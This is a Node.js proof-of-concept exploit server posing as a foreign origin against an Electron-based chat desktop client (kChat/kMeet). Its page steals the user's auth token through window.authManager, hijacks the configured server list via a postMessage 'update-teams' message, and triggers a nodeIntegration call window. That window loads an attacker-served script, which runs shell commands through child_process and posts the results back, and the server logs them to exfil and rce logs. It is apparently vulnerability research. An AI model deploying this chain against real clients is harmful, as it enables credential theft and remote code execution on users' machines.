// Foreign web origin 127.0.0.2:8098. Serves: (1) the page that runs in the kChat
// server view, (2) /static/kmeet.js which the kMeet call window fetches from
// "the current server" and injects into a nodeIntegration:true page.
const http = require('http'); const fs = require('fs');

const PAGE = `<html><body>attacker origin<script>
(async () => {
  const out = {origin: location.origin, search: location.search,
               hasDesktopAPI: typeof window.desktopAPI, hasAuthManager: typeof window.authManager};
  try { out.token = await window.authManager.tokenRequest(); } catch (e) { out.tokenErr = String(e); }
  await fetch('/log', {method: 'POST', body: JSON.stringify(out)});

  if (location.search.includes('persist')) {
    // Step 2: become the configured (and current) kChat server.
    window.postMessage({type: 'update-teams', message: {teams: [
      {display_name: 'pwned', url: location.origin, id: 'x'}]}}, location.origin);
    return;
  }

  // Step 3: loaded as the current server -> ask main to open the kMeet call window.
  // That window is nodeIntegration:true / contextIsolation:false / webSecurity:false
  // and loads \${currentServer.url}static/kmeet.js, i.e. a script from THIS origin.
  await fetch('/log', {method: 'POST', body: JSON.stringify({step: 'openKmeetCallWindow'})});
  window.desktopAPI.openKmeetCallWindow({name: 'poc', channelID: 'c1', conferenceId: 'c1',
    locale: 'en', jwt: 'x', avatar: '', user: {first_name: 'poc'}});
})();
</script></body></html>`;

// Benign PoC payload: proves Node code execution, writes one marker file, exfils `id`.
const PAYLOAD = `
(async () => {
  const res = {marker: 'KCHAT_RCE_POC'};
  try {
    const cp = require('child_process');
    res.require = 'available';
    res.id = cp.execSync('id').toString().trim();
    res.host = cp.execSync('uname -a').toString().trim();
    require('fs').writeFileSync('/tmp/KCHAT_RCE_PROOF.txt', 'code executed at ' + new Date().toISOString() + '\\n');
    res.wroteFile = '/tmp/KCHAT_RCE_PROOF.txt';
  } catch (e) { res.err = String(e); }
  try { res.processType = process.type; res.versions = process.versions.electron; } catch (e) {}
  await fetch('http://127.0.0.2:8098/rce', {method: 'POST', body: JSON.stringify(res)});
})();
`;

http.createServer((req, res) => {
  if (req.url === '/log' || req.url === '/rce') {
    let b = ''; req.on('data', (c) => b += c);
    req.on('end', () => {
      const tag = req.url === '/rce' ? 'RCE' : 'LOG';
      fs.appendFileSync(req.url === '/rce' ? 'rce.log' : 'exfil.log', b + '\n');
      console.log('[attacker] ' + tag + ': ' + b);
      res.setHeader('Access-Control-Allow-Origin', '*'); res.end('ok');
    });
    return;
  }
  console.log('[attacker] ' + req.method + ' ' + req.url);
  if (req.url.startsWith('/static/kmeet.js')) {
    res.setHeader('Content-Type', 'application/javascript');
    return res.end(PAYLOAD);
  }
  if (req.url.startsWith('/api/v4/config/client')) { res.setHeader('Content-Type','application/json'); return res.end(JSON.stringify({Version:'9.5.0', SiteURL: 'http://127.0.0.2:8098', SiteName:'pwned'})); }
  if (req.url.startsWith('/api/v4/plugins/webapp')) { res.setHeader('Content-Type','application/json'); return res.end('[]'); }
  if (req.url.startsWith('/api/v4/license/client')) { res.setHeader('Content-Type','application/json'); return res.end('{}'); }
  res.setHeader('Content-Type', 'text/html'); res.end(PAGE);
}).listen(8098, '127.0.0.2', () => console.log('[attacker] listening 127.0.0.2:8098'));
